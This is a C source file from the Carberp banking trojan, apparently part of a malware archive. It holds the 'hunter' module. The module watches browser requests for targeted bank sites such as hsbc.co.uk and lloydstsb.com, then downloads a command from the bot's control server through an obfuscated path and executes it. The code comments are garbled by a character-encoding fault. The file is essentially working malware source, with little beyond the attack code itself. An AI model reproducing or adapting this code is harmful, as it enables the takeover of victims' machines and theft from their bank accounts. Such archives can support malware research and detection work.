/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Hunter.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "BotHTTP.h"
#include "Task.h"
#include "StealthBrowser.h"

#include "Modules.h"
#include "Config.h"

HANDLE MutexHandle;

//������� ���� � ������ �� ���
//�� ������ ������� ��� ���� � �������,�������� � ����� ����� �� � ��������� ��
void Hunting()
{
	PCHAR HTMLCode = NULL;
	char* Host = GetCurrentHost();
	char AllHost[256];
	char path[]={'/','s','e','t','/','h','u','n','t','e','r','.','h','t','m','l',0};
	m_memset(AllHost,0,256);
	m_lstrcpy(AllHost,Host);
	m_lstrcat(AllHost,path);
	
	DownloadCommand(AllHost,NULL, &HTMLCode);//192.168.1.1:8888	
	int iStr=STR::Pos(HTMLCode," ",0);
	
	ExecuteSBCommand(NULL, NULL, &HTMLCode[iStr+1]);
	//Strings::Free(HTMLCode);
}
bool IsSbStarted()
{
	HANDLE tmp;
	tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,false, "IsALive");
	if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
	{
		DbgMsg("noL",0,"");
		return false;
	}
	else
	{
		DbgMsg("Live",0,"");
		return true;
	}
}
DWORD WINAPI RunHuntThred( LPVOID lpData )
{
//���� ���� ���� �� �����,�� ���� �� ���� ������ � ��������� ��
//������ ����� ������ 127.0.0.1:5555

	if (isFileExists(0x001a,L"hnt.dat"))
	{
		Hunting();
	}	
	
	HANDLE tmp;
	while(true)
	{
		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,false, "Hnt");
		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
		{	
			if (isFileExists(0x001a,L"hnt.dat"))//&&!IsSbStarted()
			{
				Hunting();
			}
			pSleep(90);
		}
		else
		{			
			Hunting();
			pCloseHandle(tmp);
			FileCreateInFolder(0x001a,L"hnt.dat",NULL,0);
			break;
		}
	}	
	return 0;
}

//��������� ����� ��������, �� ����������� ��������� ��������, � ��������� ��
void StartHunt()
{
	StartThread(RunHuntThred,NULL);
}
bool runM=false;
//��������� ���� �� ���, �� ������� ���������

char MasOfQwest[][100] =	{	"*hsbc.co.uk/1/2/*",
								"*lloydstsb.com*",
								"|"};

void IsBankHunter( HINTERNET hRequest )
{
	if(runM)return;
	
	DWORD dwUrlSize = 4096;
	char *Url		= (char*)MemAlloc( dwUrlSize );
//���� ���� ���� �� �����,�� �����
//������ ����� ������ 127.0.0.1:711
	
	if ( Url )
	{
		if ((BOOL)pInternetQueryOptionA( hRequest, INTERNET_OPTION_URL, Url, &dwUrlSize ) )
		//strcpy(Url,(const char*)hRequest);
		{
			int count=0;
			while(true)
			{
				if(MasOfQwest[count][0]=='|')break; 
				if ( CompareUrl( &MasOfQwest[count][0], Url ) )
				{				
					MutexHandle=(HANDLE)pCreateMutexA(NULL,false,"Hnt");
					pSleep(100); 
					pCloseHandle(MutexHandle);

					runM=true;
					break; 
				}
				count++;
			}
		}
		MemFree( Url );
	}
	return;
}